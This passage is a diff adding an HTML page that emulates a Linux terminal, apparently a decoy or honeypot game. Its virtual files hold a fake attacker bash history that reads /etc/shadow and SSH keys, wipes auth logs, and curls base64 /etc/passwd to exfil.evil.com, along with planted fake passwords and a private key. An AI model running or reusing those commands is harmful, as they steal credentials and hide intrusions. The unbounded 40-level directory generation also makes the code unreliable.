@@ -1,0 +1,1818 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Terminal Shell</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #DDD;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            overflow: hidden;
+            height: 100vh;
+        }
+        
+        #terminal {
+            width: 100%;
+            height: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            line-height: 1.4;
+        }
+        
+        #input-line {
+            display: flex;
+            white-space: nowrap;
+        }
+        
+        #prompt {
+            color: #0F0;
+            margin-right: 5px;
+        }
+        
+        #prompt-path {
+            color: #0CF;
+        }
+        
+        #prompt-user {
+            color: #0F0;
+        }
+        
+        #prompt-host {
+            color: #0F0;
+        }
+        
+        #input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #FFF;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            outline: none;
+            caret-color: #FFF;
+        }
+        
+        .output {
+            margin: 0;
+            padding: 0;
+        }
+        
+        /* Command output colors */
+        .dir {
+            color: #4DA6FF;
+            font-weight: bold;
+        }
+        
+        .executable {
+            color: #50FA7B;
+            font-weight: bold;
+        }
+        
+        .symlink {
+            color: #FF79C6;
+            font-weight: bold;
+        }
+        
+        .file {
+            color: #F8F8F2;
+        }
+        
+        .error {
+            color: #FF5555;
+        }
+        
+        .success {
+            color: #50FA7B;
+        }
+        
+        .warning {
+            color: #F1FA8C;
+        }
+        
+        .system {
+            color: #BD93F9;
+        }
+        
+        .timestamp {
+            color: #8BE9FD;
+        }
+        
+        .user {
+            color: #FFB86C;
+        }
+        
+        .password {
+            color: #FF79C6;
+        }
+        
+        .highlight {
+            color: #F1FA8C;
+            font-weight: bold;
+        }
+        
+        .hidden {
+            color: #6272A4;
+        }
+        
+        #cursor {
+            display: inline-block;
+            width: 8px;
+            height: 14px;
+            background-color: #FFF;
+            vertical-align: middle;
+            animation: blink 1s steps(2) infinite;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        
+        /* For cursor positioning */
+        #command-input {
+            position: relative;
+        }
+        
+        /* Styling for help text */
+        .help-command {
+            color: #50FA7B;
+            font-weight: bold;
+        }
+        
+        .help-args {
+            color: #8BE9FD;
+            font-style: italic;
+        }
+        
+        .help-desc {
+            color: #F8F8F2;
+        }
+        
+        /* Matrix effect */
+        .matrix-char {
+            color: #0F0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1;
+            position: absolute;
+            animation: matrix-fall linear infinite;
+        }
+        
+        @keyframes matrix-fall {
+            0% { transform: translateY(-100vh); opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0.3; }
+        }
+    </style>
+</head>
+<body>
+    <div id="terminal">
+        <div class="output system">
+Terminal Shell v1.0.0
+Copyright (c) 2025 CertGames. All rights reserved.
+Type 'help' for a list of available commands.
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃                                  ! WARNING !                                  ┃
+┃      This system is restricted to authorized users for legitimate purposes    ┃
+┃      All activities are logged and monitored. Unauthorized access is          ┃
+┃      strictly prohibited and violators will be prosecuted to the full         ┃
+┃      extent of the law.                                                       ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+</div>
+    </div>
+
+    <script>
+        // Get terminal element
+        const terminal = document.getElementById('terminal');
+        
+        // Virtual file system
+        const fileSystem = {
+            '/': {
+                type: 'dir',
+                children: {
+                    'home': {
+                        type: 'dir',
+                        children: {
+                            'admin': {
+                                type: 'dir',
+                                children: {
+                                    '.bash_history': {
+                                        type: 'file',
+                                        content: 'cd /root\nsudo su\nls -la\ncat /etc/shadow\nssh-keygen\ncat ~/.ssh/id_rsa\nrm -rf /var/log/auth.log\ncurl -s https://exfil.evil.com/data.php?d=$(cat /etc/passwd | base64)\nhistory -c\nexit'
+                                    },
+                                    '.ssh': {
+                                        type: 'dir',
+                                        children: {
+                                            'id_rsa': {
+                                                type: 'file',
+                                                content: '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAvJ6XB5wq5spw9kQk8YWY8bTMBkCvAC7p7TaBxQPi1zFMenJW\nUN2u6uZBGkw7V4+g0hZzS4SS1iqr6md40wECwWYf9ZQ+cDuRiIHYGYQtaPVFxEEd\nOl8nEDqnH/lRYfbqwKz3MDiHHfvSSAlIQMPjOF7Z8KUAOmSVBTfPmTCiuKZPLgXe\nSIGF0Vgw3Vg2hTXP5l7Gw5MYX3+qAx/d+D1teoFTCYn+z7JYI8xnQ3seTQiZrjWx\nTcyJwUY6fXRW1C2l7TNFjzDd1CVhvlgHQHHCt7koeNnN2S5uTVt8nbU0sLCTEV6v\nQbV0fqKt/9CK3kNZsSmgEE6uXS1AwOThjUW4xwIDAQABAoIBAQCwuoVBZ+t1KrRQ\nOM5r8L2g9c6CP2YZ0Q+35YZ6GsPtlt7DRLwJQRCTaA8g3DnK2vfGObk2Z5aB9hmQ-----END RSA PRIVATE KEY-----'
+                                            },
+                                            'id_rsa.pub': {
+                                                type: 'file',
+                                                content: 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8npcHnCrmynD2RCTxhZjxtMwGQK8ALuntNoHFA+LXMUx6clZQ3a7q5kEaTDtXj6DSFnNLhJLWKqvqZ3jTAQLBZh/1lD5wO5GIgdgZhC1o9UXEQR06XycQOqcf+VFh9urArPcwOIcd+9JICUhAw+M4Xtnw admin@secureserver'
+                                            },
+                                            'authorized_keys': {
+                                                type: 'file',
+                                                content: '# No authorized keys configured'
+                                            }
+                                        }
+                                    },
+                                    'notes': {
+                                        type: 'dir',
+                                        children: {
+                                            'TODO.txt': {
+                                                type: 'file',
+                                                content: '- Change default passwords on production servers\n- Rotate API keys for payment gateway\n- Fix SQL injection vulnerability in login page\n- Update firewall rules\n- Check server logs for suspicious activity\n- Backup customer database'
+                                            },
+                                            'passwords.txt': {
+                                                type: 'file',
+                                                content: 'Main Admin: Sup3rS3cr3t!2023\nBackup Admin: BackupA$$2023\nCloud Storage: 9YU2kqs!#kl$\nPayment Gateway: Pay@cce$$2023\nNote: CHANGE THESE IMMEDIATELY!'
+                                            },
+                                            'incident_response.txt': {
+                                                type: 'file',
+                                                content: 'In case of security breach:\n1. Disconnect affected systems from network\n2. Preserve evidence and logs\n3. Contact security team at security@example.com\n4. Do NOT attempt to handle the incident alone\n5. Document all actions taken during response'
+                                            }
+                                        }
+                                    },
+                                    'projects': {
+                                        type: 'dir',
+                                        children: {}
+                                    }
+                                }
+                            },
+                            'user': {
+                                type: 'dir',
+                                children: {
+                                    'documents': {
+                                        type: 'dir',
+                                        children: {
+                                            'personal.txt': {
+                                                type: 'file',
+                                                content: 'This is a personal note. Nothing to see here.'
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    'etc': {
+                        type: 'dir',
+                        children: {
+                            'passwd': {
+                                type: 'file',
+                                content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsshd:x:104:65534::/run/sshd:/usr/sbin/nologin\nadmin:x:1000:1000:Admin User,,,:/home/admin:/bin/bash\nuser:x:1001:1001:Regular User,,,:/home/user:/bin/bash'
+                            },
+                            'shadow': {
+                                type: 'file',
+                                content: 'Permission denied: /etc/shadow'
+                            },
+                            'hosts': {
+                                type: 'file',
+                                content: '127.0.0.1 localhost\n127.0.1.1 secureserver\n\n# The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters'
+                            },
+                            'crontab': {
+                                type: 'file',
+                                content: '# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don\'t have to run the `crontab\'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n0  */4  * * *   root    /usr/local/bin/backup.sh\n30 2    * * *   root    /usr/local/bin/security_scan.sh\n@reboot         root    /usr/local/bin/startup.sh'
+                            }
+                        }
+                    },
+                    'var': {
+                        type: 'dir',
+                        children: {
+                            'log': {
+                                type: 'dir',
+                                children: {
+                                    'auth.log': {
+                                        type: 'file',
+                                        content: 'Apr 30 00:12:43 secureserver sshd[2142]: Failed password for invalid user admin from 192.168.1.10 port 54637 ssh2\nApr 30 00:12:45 secureserver sshd[2142]: Failed password for invalid user admin from 192.168.1.10 port 54637 ssh2\nApr 30 00:12:48 secureserver sshd[2142]: Failed password for invalid user admin from 192.168.1.10 port 54637 ssh2\nApr 30 00:12:52 secureserver sshd[2142]: Successful login for user admin from 192.168.1.10 port 54637 ssh2\nApr 30 00:13:01 secureserver sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash\nApr 30 00:14:32 secureserver sshd[2143]: Connection closed by 192.168.1.10 port 54637'
+                                    },
+                                    'syslog': {
+                                        type: 'file',
+                                        content: 'Apr 30 00:01:01 secureserver CRON[2120]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)\nApr 30 00:10:23 secureserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:00:00:00:00:00:00:00:00:00:00:00:00:00 SRC=198.51.100.23 DST=203.0.113.10 LEN=40 TOS=0x00 PREC=0x00 TTL=249 ID=8475 PROTO=TCP SPT=44252 DPT=22 WINDOW=1024 RES=0x00 SYN URGP=0\nApr 30 00:11:42 secureserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:00:00:00:00:00:00:00:00:00:00:00:00:00 SRC=198.51.100.23 DST=203.0.113.10 LEN=40 TOS=0x00 PREC=0x00 TTL=249 ID=8475 PROTO=TCP SPT=44252 DPT=22 WINDOW=1024 RES=0x00 SYN URGP=0\nApr 30 00:15:13 secureserver dhclient[635]: DHCPREQUEST of 203.0.113.10 on eth0 to 203.0.113.1 port 67 (xid=0x3b82f998)\nApr 30 00:15:13 secureserver dhclient[635]: DHCPACK of 203.0.113.10 from 203.0.113.1\nApr 30 00:15:13 secureserver dhclient[635]: bound to 203.0.113.10 -- renewal in 34767 seconds.'
+                                    },
+                                    'apache2': {
+                                        type: 'dir',
+                                        children: {
+                                            'access.log': {
+                                                type: 'file',
+                                                content: '192.168.1.100 - - [30/Apr/2025:00:05:21 +0000] "GET / HTTP/1.1" 200 3258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"\n192.168.1.100 - - [30/Apr/2025:00:05:22 +0000] "GET /css/main.css HTTP/1.1" 200 4392 "http://secureserver/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"\n192.168.1.100 - - [30/Apr/2025:00:05:22 +0000] "GET /js/scripts.js HTTP/1.1" 200 2837 "http://secureserver/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"\n203.0.113.42 - - [30/Apr/2025:00:08:42 +0000] "GET /wp-login.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"\n203.0.113.42 - - [30/Apr/2025:00:08:43 +0000] "GET /administrator/index.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"\n192.168.1.100 - - [30/Apr/2025:00:09:13 +0000] "GET /admin HTTP/1.1" 301 309 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"\n192.168.1.100 - - [30/Apr/2025:00:09:13 +0000] "GET /admin/ HTTP/1.1" 200 4209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"'
+                                            },
+                                            'error.log': {
+                                                type: 'file',
+                                                content: '[Wed Apr 30 00:03:12.636823 2025] [mpm_prefork:notice] [pid 1234] AH00163: Apache/2.4.41 (Ubuntu) configured -- resuming normal operations\n[Wed Apr 30 00:03:12.636954 2025] [core:notice] [pid 1234] AH00094: Command line: \'/usr/sbin/apache2\'\n[Wed Apr 30 00:08:42.321654 2025] [php7:error] [pid 1236] [client 203.0.113.42:52431] script \'/var/www/html/wp-login.php\' not found or unable to stat\n[Wed Apr 30 00:08:43.543219 2025] [php7:error] [pid 1237] [client 203.0.113.42:52432] script \'/var/www/html/administrator/index.php\' not found or unable to stat'
+                                            }
+                                        }
+                                    }
+                                }
+                            },
+                            'www': {
+                                type: 'dir',
+                                children: {
+                                    'html': {
+                                        type: 'dir',
+                                        children: {
+                                            'index.html': {
+                                                type: 'file',
+                                                content: '<!DOCTYPE html>\n<html>\n<head>\n    <title>Welcome to SecureServer</title>\n    <link rel="stylesheet" href="/main.css">\n</head>\n<body>\n    <h1>Welcome to SecureServer</h1>\n    <p>This server is running Apache/2.4.41 on Ubuntu.</p>\n    <p>Default website. Please configure your virtual host.</p>\n    <script src="/js/scripts.js"></script>\n</body>\n</html>'
+                                            },
+                                            'admin': {
+                                                type: 'dir',
+                                                children: {
+                                                    'index.html': {
+                                                        type: 'file',
+                                                        content: '<!DOCTYPE html>\n<html>\n<head>\n    <title>Administration Panel</title>\n    <link rel="stylesheet" href="/admin.css">\n</head>\n<body>\n    <h1>Admin Panel</h1>\n    <form action="/admin/login.php" method="post">\n        <label for="username">Username:</label>\n        <input type="text" id="username" name="username" required>\n        <label for="password">Password:</label>\n        <input type="password" id="password" name="password" required>\n        <button type="submit">Login</button>\n    </form>\n    <script src="/js/admin.js"></script>\n</body>\n</html>'
+                                                    },
+                                                    'login.php': {
+                                                        type: 'file',
+                                                        content: '<?php\n// This is a simple login script\nsession_start();\n\n$admin_user = "admin";\n$admin_pass = "Sup3rS3cr3t!2023"; // Should be in a secure config file\n\nif ($_SERVER["REQUEST_METHOD"] == "POST") {\n    $username = $_POST["username"];\n    $password = $_POST["password"];\n    \n    if ($username === $admin_user && $password === $admin_pass) {\n        $_SESSION["admin"] = true;\n        header("Location: dashboard.php");\n        exit;\n    } else {\n        $error = "Invalid username or password";\n    }\n}\n?>'
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    'root': {
+                        type: 'dir',
+                        children: {
+                            '.bash_history': {
+                                type: 'file',
+                                content: 'ls -la\ncd /var/log\ntail -f auth.log\ngrep "Failed password" /var/log/auth.log\niptables -L\nexit'
+                            },
+                            'backup': {
+                                type: 'dir',
+                                children: {
+                                    'backup-2025-04-29.tar.gz': {
+                                        type: 'file',
+                                        content: 'Binary file: backup-2025-04-29.tar.gz'
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    'usr': {
+                        type: 'dir',
+                        children: {
+                            'bin': {
+                                type: 'dir',
+                                children: {
+                                    'bash': {
+                                        type: 'file',
+                                        content: 'Binary file: bash'
+                                    },
+                                    'ls': {
+                                        type: 'file',
+                                        content: 'Binary file: ls'
+                                    },
+                                    'cd': {
+                                        type: 'file',
+                                        content: 'Binary file: cd'
+                                    }
+                                }
+                            },
+                            'local': {
+                                type: 'dir',
+                                children: {
+                                    'bin': {
+                                        type: 'dir',
+                                        children: {
+                                            'backup.sh': {
+                                                type: 'file',
+                                                content: '#!/bin/bash\n# Backup script\nBACKUP_DIR="/root/backup"\nWWW_DIR="/var/www/html"\nDATETIME=$(date +%Y-%m-%d)\n\n# Create backup directory if it doesn\'t exist\nmkdir -p $BACKUP_DIR\n\n# Backup www directory\ntar -czf $BACKUP_DIR/backup-$DATETIME.tar.gz $WWW_DIR\n\n# Keep only last 7 backups\nfind $BACKUP_DIR -name "backup-*.tar.gz" -type f -mtime +7 -delete\n\necho "Backup completed: $BACKUP_DIR/backup-$DATETIME.tar.gz"'
+                                            },
+                                            'security_scan.sh': {
+                                                type: 'file',
+                                                content: '#!/bin/bash\n# Security scan script\nLOG_DIR="/var/log"\nREPORT_FILE="/root/security_report.txt"\n\necho "Security Scan Report - $(date)" > $REPORT_FILE\necho "=======================================" >> $REPORT_FILE\n\n# Check for failed SSH login attempts\necho "\\nFailed SSH Login Attempts:" >> $REPORT_FILE\ngrep "Failed password" $LOG_DIR/auth.log | tail -n 10 >> $REPORT_FILE\n\n# Check for suspicious processes\necho "\\nSuspicious Processes:" >> $REPORT_FILE\nps aux | grep -v "^root\\|^www-data\\|^mysql\\|^sshd" >> $REPORT_FILE\n\n# Check for modified system files\necho "\\nModified System Files in the Last 24 Hours:" >> $REPORT_FILE\nfind /bin /usr/bin /sbin /usr/sbin -mtime -1 -type f | xargs ls -la >> $REPORT_FILE\n\necho "\\nScan completed at $(date)" >> $REPORT_FILE'
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    'opt': {
+                        type: 'dir',
+                        children: {}
+                    },
+                    'tmp': {
+                        type: 'dir',
+                        children: {
+                            'sess_12345': {
+                                type: 'file',
+                                content: 'admin|s:4:"true";'
+                            }
+                        }
+                    },
+                    'bin': {
+                        type: 'dir',
+                        children: {
+                            'ls': {
+                                type: 'file',
+                                content: 'Binary file: ls'
+                            },
+                            'bash': {
+                                type: 'file',
+                                content: 'Binary file: bash'
+                            }
+                        }
+                    },
+                    'users.db': {
+                        type: 'dir',
+                        children: this.generateNestedDirs('users.db', 40)
+                    },
+                    'configs': {
+                        type: 'dir',
+                        children: this.generateNestedDirs('configs', 40)
+                    },
+                    'logs': {
+                        type: 'dir',
+                        children: this.generateNestedDirs('logs', 40)
+                    },
+                    'backups': {
+                        type: 'dir',
+                        children: this.generateNestedDirs('backups', 40)
+                    },
+                    'api': {
+                        type: 'dir',
+                        children: this.generateNestedDirs('api', 40)
+                    },
+                    'secrets': {
+                        type: 'dir',
+                        children: this.generateNestedDirs('secrets', 40)
+                    },
+                    'credentials': {
+                        type: 'dir',
+                        children: this.generateNestedDirs('credentials', 40)
+                    }
+                }
+            }
+        };
+        
+        // Generate nested directories
+        function generateNestedDirs(baseName, depth) {
+            const children = {};
+            
+            if (depth <= 0) {
+                return {
+                    'secret.txt': {
+                        type: 'file',
+                        content: `Congratulations! You've reached the end of the ${baseName} directory tree. Here's your secret message: "${generateSecretMessage(baseName)}"`
+                    }
+                };
+            }
+            
+            // Generate 3 subdirectories
+            for (let i = 1; i <= 3; i++) {
+                const dirName = `${baseName}_level_${depth}_path_${i}`;
+                children[dirName] = {
+                    type: 'dir',
+                    children: generateNestedDirs(dirName, depth - 1)
+                };
+            }
+            
+            // Add a dummy file
+            children[`${baseName}_info.txt`] = {
+                type: 'file',
+                content: `This is level ${depth} of the ${baseName} directory. Keep exploring!`
+            };
+            
+            return children;
+        }
+        
+        // Generate a unique secret message for each deep directory
+        function generateSecretMessage(dirName) {
+            const secretMessages = [
+                "The treasure was inside you all along!",
+                "You must be really persistent to find this!",
+                "This is not the secret you're looking for...",
+                "Congratulations on your determination!",
+                "You've earned the title of Master Explorer!",
+                "This is just the beginning of the rabbit hole...",
+                "Not many have ventured this deep!",
+                "You should definitely try the 'matrix' command now!",
+                "Have you tried the 'sudo make me a sandwich' command?",
+                "The cake is a lie, but this achievement is real!"
+            ];
+            
+            // Use the directory name to consistently pick a message
+            const hash = dirName.split('').reduce((hash, char) => hash + char.charCodeAt(0), 0);
+            return secretMessages[hash % secretMessages.length];
+        }
+        
+        // Current directory and user state
+        let currentDir = '/home/admin';
+        const username = 'admin';
+        const hostname = 'secureserver';
+        let commandHistory = [];
+        let historyIndex = -1;
+        let matrixInterval = null;
+        
+        // Get a directory from the file system
+        function getDirectory(path) {
+            // Handle absolute and relative paths
+            let resolvedPath = path;
+            if (!path.startsWith('/')) {
+                resolvedPath = resolvePath(currentDir, path);
+            }
+            
+            // Split the path into components
+            const components = resolvedPath.split('/').filter(c => c !== '');
+            
+            // Start at the root
+            let current = fileSystem['/'];
+            
+            // Traverse the path
+            for (const component of components) {
+                if (component === '..') {
+                    // Up one level - already handled by resolvePath
+                    continue;
+                }
+                
+                if (!current.children || !current.children[component]) {
+                    return null; // Path not found
+                }
+                
+                current = current.children[component];
+            }
+            
+            return current;
+        }
+        
+        // Resolve a path (handle ./, ../, etc.)
+        function resolvePath(currentPath, relativePath) {
+            // If it's an absolute path, just return it
+            if (relativePath.startsWith('/')) {
+                return relativePath;
+            }
+            
+            // Split the current path and relative path
+            const currentComponents = currentPath.split('/').filter(c => c !== '');
+            const relativeComponents = relativePath.split('/').filter(c => c !== '');
+            
+            // Start with the current path
+            const resultComponents = [...currentComponents];
+            
+            // Process each component of the relative path
+            for (const component of relativeComponents) {
+                if (component === '.') {
+                    // Current directory, do nothing
+                    continue;
+                } else if (component === '..') {
+                    // Parent directory, remove the last component
+                    if (resultComponents.length > 0) {
+                        resultComponents.pop();
+                    }
+                } else {
+                    // Regular directory, add it
+                    resultComponents.push(component);
+                }
+            }
+            
+            // Construct the final path
+            return '/' + resultComponents.join('/');
+        }
+        
+        // Execute a command
+        function executeCommand(command) {
+            if (!command.trim()) {
+                return '';
+            }
+            
+            // Save to history
+            commandHistory.push(command);
+            historyIndex = commandHistory.length;
+            
+            // Split the command by spaces, but respect quotes
+            const args = parseCommandLine(command);
+            const cmd = args[0];
+            
+            // Log interaction with the honeypot
+            logInteraction(command);
+            
+            // Execute the command
+            switch (cmd) {
+                case 'cd':
+                    return cd(args.slice(1));
+                case 'ls':
+                    return ls(args.slice(1));
+                case 'cat':
+                    return cat(args.slice(1));
+                case 'pwd':
+                    return pwd();
+                case 'whoami':
+                    return whoami();
+                case 'echo':
+                    return echo(args.slice(1));
+                case 'help':
+                    return showHelp();
+                case 'clear':
+                    terminal.innerHTML = '';
+                    return '';
+                case 'exit':
+                    return exit();
+                case 'date':
+                    return getDate();
+                case 'id':
+                    return getId();
+                case 'uname':
+                    return uname(args.slice(1));
+                case 'grep':
+                    return grep(args.slice(1));
+                case 'find':
+                    return find(args.slice(1));
+                case 'touch':
+                    return touch(args.slice(1));
+                case 'mkdir':
+                    return mkdir(args.slice(1));
+                case 'rm':
+                    return rm(args.slice(1));
+                case 'cp':
+                    return cp(args.slice(1));
+                case 'mv':
+                    return mv(args.slice(1));
+                case 'history':
+                    return showHistory();
+                case 'sudo':
+                    return sudo(args.slice(1));
+                case 'ps':
+                    return ps(args.slice(1));
+                case 'top':
+                    return top();
+                case 'df':
+                    return df(args.slice(1));
+                case 'du':
+                    return du(args.slice(1));
+                case 'nano':
+                case 'vi':
+                case 'vim':
+                    return editor(args[1]);
+                case 'wget':
+                case 'curl':
+                    return download(args.slice(1));
+                case 'ssh':
+                    return ssh(args.slice(1));
+                case 'chmod':
+                    return chmod(args.slice(1));
+                case 'chown':
+                    return chown(args.slice(1));
+                case 'man':
+                    return man(args[1]);
+                case 'matrix':
+                    return runMatrix();
+                case 'cowsay':
+                    return cowsay(args.slice(1));
+                case 'rev':
+                    return rev(args.slice(1));
+                case 'sl':
+                    return sl();
+                case 'banner':
+                    return banner(args.slice(1));
+                case 'fortune':
+                    return fortune();
+                default:
+                    return `<span class="error">${cmd}: command not found</span>`;
+            }
+        }
+        
+        // Parse command line respecting quotes
+        function parseCommandLine(commandLine) {
+            const args = [];
+            let current = '';
+            let inQuotes = false;
+            let escapeNext = false;
+            
+            for (let i = 0; i < commandLine.length; i++) {
+                const char = commandLine[i];
+                
+                if (escapeNext) {
+                    current += char;
+                    escapeNext = false;
+                } else if (char === '\\') {
+                    escapeNext = true;
+                } else if (char === '"' && !inQuotes) {
+                    inQuotes = true;
+                } else if (char === '"' && inQuotes) {
+                    inQuotes = false;
+                } else if (char === ' ' && !inQuotes) {
+                    if (current) {
+                        args.push(current);
+                        current = '';
+                    }
+                } else {
+                    current += char;
+                }
+            }
+            
+            if (current) {
+                args.push(current);
+            }
+            
+            return args;
+        }
+        
+        // cd command
+        function cd(args) {
+            if (args.length === 0) {
+                currentDir = `/home/${username}`;
+                return '';
+            }
+            
+            const newPath = resolvePath(currentDir, args[0]);
+            const dir = getDirectory(newPath);
+            
+            if (!dir) {
+                return `<span class="error">cd: ${args[0]}: No such file or directory</span>`;
+            }
+            
+            if (dir.type !== 'dir') {
+                return `<span class="error">cd: ${args[0]}: Not a directory</span>`;
+            }
+            
+            currentDir = newPath;
+            return '';
+        }
+        
+        // ls command
+        function ls(args) {
+            let path = '.';
+            let showHidden = false;
+            let longFormat = false;
+            
+            // Parse options
+            for (const arg of args) {
+                if (arg.startsWith('-')) {
+                    // Handle options
+                    for (let i = 1; i < arg.length; i++) {
+                        const option = arg[i];
+                        if (option === 'a') {
+                            showHidden = true;
+                        } else if (option === 'l') {
+                            longFormat = true;
+                        }
+                    }
+                } else {
+                    // It's a path
+                    path = arg;
+                }
+            }
+            
+            const resolvedPath = resolvePath(currentDir, path);
+            const dir = getDirectory(resolvedPath);
+            
+            if (!dir) {
+                return `<span class="error">ls: cannot access '${path}': No such file or directory</span>`;
+            }
+            
+            if (dir.type !== 'dir') {
+                return `<span class="${getFileClass(dir)}">${path}</span>`;
+            }
+            
+            let output = '';
+            
+            // If path is a directory, list its contents
+            if (longFormat) {
+                // Long format header
+                output += 'total ' + Object.keys(dir.children).length + '\n';
+                
+                // Add entries for . and ..
+                if (showHidden) {
+                    output += 'drwxr-xr-x  2 ' + username + ' ' + username + '  4096 Apr 30 00:00 <span class="dir">.</span>\n';
+                    output += 'drwxr-xr-x  4 ' + username + ' ' + username + '  4096 Apr 30 00:00 <span class="dir">..</span>\n';
+                }
+                
+                // List files and directories
+                for (const name in dir.children) {
+                    if (name.startsWith('.') && !showHidden) {
+                        continue;
+                    }
+                    
+                    const item = dir.children[name];
+                    const itemClass = getFileClass(item);
+                    const isHidden = name.startsWith('.');
+                    
+                    let permissions, fileType;
+                    if (item.type === 'dir') {
+                        permissions = 'drwxr-xr-x';
+                        fileType = 'd';
+                    } else {
+                        permissions = '-rw-r--r--';
+                        fileType = '-';
+                    }
+                    
+                    let size = item.type === 'dir' ? 4096 : (item.content ? item.content.length : 0);
+                    
+                    output += `${permissions}  1 ${username} ${username}  ${size} Apr 30 00:00 <span class="${itemClass}${isHidden ? ' hidden' : ''}">${name}</span>\n`;
+                }
+            } else {
+                // Simple format
+                const entries = [];
+                
+                // Add . and .. for -a option
+                if (showHidden) {
+                    entries.push('<span class="dir">.</span>');
+                    entries.push('<span class="dir">..</span>');
+                }
+                
+                // List files and directories
+                for (const name in dir.children) {
+                    if (name.startsWith('.') && !showHidden) {
+                        continue;
+                    }
+                    
+                    const item = dir.children[name];
+                    const itemClass = getFileClass(item);
+                    const isHidden = name.startsWith('.');
+                    
+                    entries.push(`<span class="${itemClass}${isHidden ? ' hidden' : ''}">${name}</span>`);
+                }
+                
+                output = entries.join('  ');
+            }
+            
+            return output;
+        }
+        
+        // Determine CSS class for files
+        function getFileClass(item) {
+            if (item.type === 'dir') {
+                return 'dir';
+            } else if (item.type === 'file') {
+                // Check if the file is executable (simplified)
+                if (item.executable) {
+                    return 'executable';
+                } else if (item.symlink) {
+                    return 'symlink';
+                } else {
